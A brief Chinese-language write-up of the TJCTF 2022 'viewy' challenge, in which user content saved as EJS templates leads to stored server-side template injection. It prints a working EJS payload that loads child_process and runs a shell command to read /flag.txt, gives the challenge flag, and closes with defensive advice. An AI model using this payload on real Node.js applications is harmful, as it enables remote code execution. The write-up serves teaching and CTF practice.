# TJCTF2022 viewy

## 题目简述

站点允许用户提交“自定义视图”。后端把 `content` 原样写入 `views/uploads/<uuid>.ejs`，浏览时又由固定模板通过 EJS `include` 加载该文件。用户内容因此不是普通文本，而会作为服务端模板执行，形成存储型 EJS SSTI。

## 解题过程

提交的内容可以直接使用 EJS 输出表达式。Node.js 环境中通过 `process.mainModule.constructor._load` 取得 `child_process`，执行命令并把结果插入页面：

```ejs
<%= global.process.mainModule.constructor
  ._load("child_process")
  .execSync("cat /flag.txt") %>
```

POST `/` 后服务返回 `/views/<uuid>`。访问该地址时，固定模板执行：

```ejs
<%- include(`uploads/${id}`) %>
```

刚写入的恶意模板由服务端解释，`cat /flag.txt` 的输出进入响应正文。提取页面内容即可得到 `tjctf{4l1_th3_v1eW5_wh3333e333}`。

## 方法总结

用户可编辑的“模板”本质上接近任意代码执行，不能与应用模板共享同一解释器和进程权限。这里 UUID 文件名只隐藏位置，无法限制模板语法。若业务只需要展示文本，应转义后作为数据渲染；若确实需要模板能力，则必须采用严格受限的表达式语言、隔离执行环境并禁止访问宿主对象。
